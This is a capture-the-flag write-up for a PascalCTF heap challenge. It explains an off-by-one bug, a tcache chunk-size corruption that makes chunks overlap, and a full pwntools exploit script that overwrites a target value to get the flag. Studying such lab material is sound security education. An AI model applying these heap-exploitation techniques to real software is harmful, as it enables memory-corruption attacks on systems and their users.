# AHC - Average Heap Challenge: Complete Solution

## Challenge Overview

| Field | Value |
|-------|-------|
| Category | Pwn |
| Difficulty | Medium |
| Connection | `nc ahc.ctf.pascalctf.it 9003` |
| Files | `average` (binary), `libc.so.6`, `ld-linux-x86-64.so.2` |
| Technique | House of Kauri / Overlapping Chunks |
| Flag | `pascalCTF{1m4g1n3_N0t_Kn0w1n9_H34P...}` |

---

## Binary Analysis

### Protections

```
$ checksec ./orig/average
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All protections are enabled, but since this is a heap challenge targeting a global variable, we don't need to bypass ASLR or defeat canaries.

### Program Functionality

The binary implements a simple "player management system" with the following menu:

```
1. Create Player
2. Delete Player
3. Print Players
4. Exit
5. (Hidden) Check Target
```

### Key Functions

#### `setup_chall()`
Called at program start:
1. Allocates 5 chunks of size 0x48 (72 bytes) into a `chunks[]` array
2. Allocates a `target` chunk and initializes it to `0xbabebabebabebabe`
3. Frees all 5 chunks in **reverse order** (4, 3, 2, 1, 0)

This populates the tcache[0x50] bin with: `chunk0 -> chunk1 -> chunk2 -> chunk3 -> chunk4`

#### `create_player(index, extra)`
1. Checks if `player_count >= 5` (limit of 5 players)
2. Prompts for index (0-4) and extra bytes needed
3. Allocates `malloc(extra + 0x48)` bytes
4. Calls `read_name()` to read player name (up to `extra + 39` chars)
5. Calculates `message_offset = max(read_name_result, extra + 32)`
6. Reads message (39 chars) into `buffer + message_offset`

#### `read_name(buffer, max_len)`
Reads a name using `scanf("%Ns", buffer)` where N = max_len.

**THE BUG**: Returns `strlen(name) + 1` instead of `strlen(name)`

#### `check_target()`
Hidden menu option (choice 5):
- If `*target == 0xdeadbeefcafebabe`: prints flag from environment
- Otherwise: prints "Target value not matched"

---

## Vulnerability Analysis

### The Off-By-One Bug

The vulnerability is in `read_name()`:

```c
size_t read_name(char *buffer, size_t max_len) {
    // ... scanf reads name ...
    return strlen(buffer) + 1;  // BUG: should be strlen(buffer)
}
```

### Impact on Message Offset

In `create_player()`:
```c
size_t name_len = read_name(buffer, extra + 39);
size_t message_offset = max(name_len, extra + 32);
// Message is written at buffer + message_offset
```

With `extra = 0` and a 39-character name:
- `read_name()` returns `39 + 1 = 40` (instead of 39)
- `message_offset = max(40, 0 + 32) = 40`
- Message (39 chars + null = 40 bytes) writes to `buffer[40:79]`
- But buffer is only 72 bytes (0x48)!

**Result**: 8-byte overflow into adjacent memory (`buffer[72:79]`)

---

## Heap Layout Analysis

### After `setup_chall()`

```
Heap Address    Content
============    =======
heap+0x000      tcache_perthread_struct
heap+0x0b0      chunk0 metadata (size=0x51, in tcache)
heap+0x0c0      chunk0 data (72 bytes)
heap+0x100      chunk1 metadata (size=0x51, in tcache)
heap+0x110      chunk1 data (72 bytes)
heap+0x150      chunk2 metadata (size=0x51, in tcache)
heap+0x160      chunk2 data (72 bytes)
heap+0x1a0      chunk3 metadata (size=0x51, in tcache)
heap+0x1b0      chunk3 data (72 bytes)
heap+0x1f0      chunk4 metadata (size=0x51, in tcache)  <- Adjacent to target!
heap+0x200      chunk4 data (72 bytes)
heap+0x248      target metadata (size=0x21)
heap+0x250      target data = 0xbabebabebabebabe        <- Our goal!
```

tcache[0x50] linked list (LIFO): `chunk0 -> chunk1 -> chunk2 -> chunk3 -> chunk4`

### Relative Offsets from Player Buffers

When player N gets chunk M, their buffer starts at the chunk's data region:

| Player | Gets Chunk | Buffer Start | buffer[72] points to |
|--------|------------|--------------|----------------------|
| 0 | chunk0 | heap+0x0c0 | heap+0x108 (chunk1 size) |
| 1 | chunk1 | heap+0x110 | heap+0x158 (chunk2 size) |
| 2 | chunk2 | heap+0x160 | heap+0x1a8 (chunk3 size) |
| 3 | chunk3 | heap+0x1b0 | heap+0x1f8 (chunk4 size) |
| 4 | chunk4 | heap+0x200 | heap+0x248 (target size) |

---

## Initial Approach: Direct Overflow (Failed)

### The Idea

Use player 4's overflow to directly write into the target:
- Player 4 buffer at heap+0x200
- Target data at heap+0x250
- Offset = 0x50 = 80 bytes

### Why It Fails

With `extra=0` and 39-char name:
- `message_offset = 40`
- Message writes to `buffer[40:79]` (40 bytes including null)
- Overflow reaches `buffer[72:79]` = target's SIZE field

**Problem**: Target DATA starts at `buffer[80]`, exactly 1 byte beyond our reach!

```
buffer[72:79] = target SIZE field   <- We can write here
buffer[79]    = null terminator     <- Lands here
buffer[80]    = target DATA start   <- 1 BYTE SHORT!
```

---

## Correct Approach: House of Kauri / Overlapping Chunks

### Key Insight

Instead of trying to overflow directly into target, we exploit the fact that **player 3's overflow corrupts chunk 4's SIZE field while chunk 4 is still in tcache**.

### The Technique

1. **Corrupt chunk size in tcache**: Player 3's buffer[72] = chunk 4's size field
2. **Change 0x51 to 0x71**: Write `'q'` (0x71) to corrupt the size
3. **Allocate corrupted chunk**: Player 4 gets chunk with fake size
4. **Free to wrong bin**: When freed, goes to tcache[0x70] instead of tcache[0x50]
5. **Reallocate as larger chunk**: Request 0x70-sized chunk, get overlapping allocation
6. **Overlap reaches target**: Larger buffer extends to cover target's data

### Why 0x71?

- Original size: 0x51 (80 bytes, fits in tcache[0x50])
- Corrupted size: 0x71 (112 bytes, fits in tcache[0x70])
- `'q'` = 0x71 in ASCII, conveniently the right value
- Size must be valid (aligned, reasonable) to pass tcache checks

### Overlapping Chunk Math

After corruption and reallocation with `extra=17`:
- `malloc(17 + 0x48) = malloc(89)` rounds to 0x70 chunk
- Retrieved from tcache[0x70] (the corrupted chunk 4)
- Chunk 4 buffer at heap+0x200, but now treated as 0x70 bytes (112 bytes)
- Buffer extends from heap+0x200 to heap+0x258
- Target data at heap+0x250 = buffer[80] - **NOW REACHABLE!**

With `extra=17`:
- `message_offset = max(40, 17+32) = max(40, 49) = 49`
- Message at `buffer[49:88]`
- `buffer[80:88]` = target data field

We can write `message[31:39]` to overwrite target!

---

## Exploitation Steps

### Step 1: Consume Tcache Entries

Create players 0, 1, 2 to pop chunks from tcache[0x50]:

```python
for i in range(3):
    create_player(i, 0, b'A', b'B')
```

After: tcache[0x50] = `chunk3 -> chunk4`

### Step 2: Corrupt Chunk 4's Size

Create player 3 with overflow payload:
- Player 3 gets chunk3, buffer at heap+0x1b0
- buffer[72] = heap+0x1f8 = chunk4's size field
- Write `'q'` (0x71) to corrupt size from 0x51 to 0x71

```python
name3 = b'A' * 39  # Maximize message_offset to 40
message3 = b'X' * 32 + b'q'  # message[32] = 'q' -> buffer[72] = 0x71
create_player(3, 0, name3, message3)
```

After: chunk4's size corrupted to 0x71 while still in tcache[0x50]

### Step 3: Allocate Corrupted Chunk

Create player 4 normally:

```python
create_player(4, 0, b'A', b'B')
```

Player 4 gets chunk4 (with corrupted size 0x71 in metadata).

### Step 4: Free to Wrong Tcache Bin

Delete player 4:

```python
delete_player(4)
```

`free()` reads the chunk's size field (0x71) and puts it in tcache[0x70] instead of tcache[0x50]!

### Step 5: Free Player 3 Index

Delete player 3 to free up the index for reuse:

```python
delete_player(3)
```

### Step 6: Allocate Overlapping Chunk

Create player 3 with `extra=17`:
- `malloc(17 + 0x48) = malloc(89)` -> requests 0x70 chunk
- Gets chunk4 from tcache[0x70]
- Buffer treated as ~89 bytes, extending past original 72-byte boundary
- `message_offset = max(40, 49) = 49`
- `message[31:39]` writes to `buffer[80:88]` = target data!

```python
name6 = b'A' * 39
target_value = p64(0xdeadbeefcafebabe)
message6 = b'X' * 31 + target_value[:8]  # message[31:39] = target value
create_player(3, 17, name6, message6)
```

### Step 7: Trigger Win Condition

```python
check_target()  # Prints flag!
```

---

## Complete Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'

def solve(io):
    def create_player(idx, extra, name, message):
        io.sendlineafter(b'Exit', b'1')
        io.sendlineafter(b'at: ', str(idx).encode())
        io.sendlineafter(b'need? ', str(extra).encode())
        io.sendlineafter(b'name: ', name)
        io.sendlineafter(b'message: ', message)

    def delete_player(idx):
        io.sendlineafter(b'Exit', b'2')
        io.sendlineafter(b'from: ', str(idx).encode())

    def check_target():
        io.sendlineafter(b'Exit', b'5')

    # Step 1: Create players 0, 1, 2
    log.info("Step 1: Creating players 0, 1, 2...")
    for i in range(3):
        create_player(i, 0, b'A', b'B')

    # Step 2: Create player 3 with size corruption
    log.info("Step 2: Corrupting chunk 4's size (0x51 -> 0x71)...")
    name3 = b'A' * 39
    message3 = b'X' * 32 + b'q'  # 'q' = 0x71
    create_player(3, 0, name3, message3)

    # Step 3: Create player 4
    log.info("Step 3: Creating player 4 (with corrupted size)...")
    create_player(4, 0, b'A', b'B')

    # Step 4: Delete player 4 (goes to tcache[0x70])
    log.info("Step 4: Freeing player 4 to wrong tcache bin...")
    delete_player(4)

    # Step 5: Delete player 3
    log.info("Step 5: Freeing player 3...")
    delete_player(3)

    # Step 6: Create overlapping chunk
    log.info("Step 6: Creating overlapping chunk with target value...")
    name6 = b'A' * 39
    target_value = p64(0xdeadbeefcafebabe)
    message6 = b'X' * 31 + target_value[:8]
    create_player(3, 17, name6, message6)

    # Step 7: Win!
    log.info("Step 7: Checking target...")
    check_target()

    io.recvuntil(b'Target', timeout=3)
    response = io.recvline()

    if b'not matched' not in response:
        log.success("FLAG FOUND!")
        remaining = io.recvall(timeout=5)
        print(remaining.decode(errors='ignore'))
    else:
        log.error("Exploit failed")

if __name__ == '__main__':
    if args.REMOTE:
        io = remote('ahc.ctf.pascalctf.it', 9003)
    else:
        io = process(['./orig/ld-linux-x86-64.so.2', '--library-path',
                      './orig', './orig/average'],
                     env={'FLAG': 'PascalCTF{test_flag}'})

    solve(io)
    io.close()
```

---

## Visualization

### Before Exploitation

```
tcache[0x50]: chunk0 -> chunk1 -> chunk2 -> chunk3 -> chunk4
tcache[0x70]: (empty)

heap+0x1f0: [prev_size][size=0x51] <- chunk4 metadata
heap+0x200: [        chunk4 data (72 bytes)        ]
heap+0x248: [prev_size][size=0x21] <- target metadata
heap+0x250: [0xbabebabebabebabe]   <- target data (GOAL: 0xdeadbeefcafebabe)
```

### After Step 2 (Size Corruption)

```
tcache[0x50]: chunk3 -> chunk4 (size corrupted!)
tcache[0x70]: (empty)

heap+0x1f0: [prev_size][size=0x71] <- CORRUPTED! Was 0x51
heap+0x200: [        chunk4 data (72 bytes)        ]
```

### After Step 4 (Wrong Bin Free)

```
tcache[0x50]: (empty)
tcache[0x70]: chunk4              <- Went to wrong bin!

heap+0x1f0: [prev_size][size=0x71][fd pointer]...
```

### After Step 6 (Overlapping Allocation)

```
Player 3 buffer: heap+0x200 to heap+0x258 (89+ bytes)
                 [-------- 72 bytes --------][-- overlap --]
                                              ^
                                              |
                                    Target data at heap+0x250
                                    = buffer[80]
                                    = message[31] with offset 49

Target now contains: 0xdeadbeefcafebabe
```

---

## Key Takeaways

1. **Off-by-one errors matter**: A single `+1` in return value created exploitable overflow
2. **Tcache is fragile**: Corrupting size fields before free redirects chunks to wrong bins
3. **Overlapping chunks**: Different-sized allocations from same memory create powerful primitives
4. **House of Kauri**: Technique specifically for corrupting tcache chunk sizes to create overlaps
5. **Math is important**: Precise offset calculations are crucial for heap exploitation

---

## Flag

```
pascalCTF{1m4g1n3_N0t_Kn0w1n9_H34P...}
```
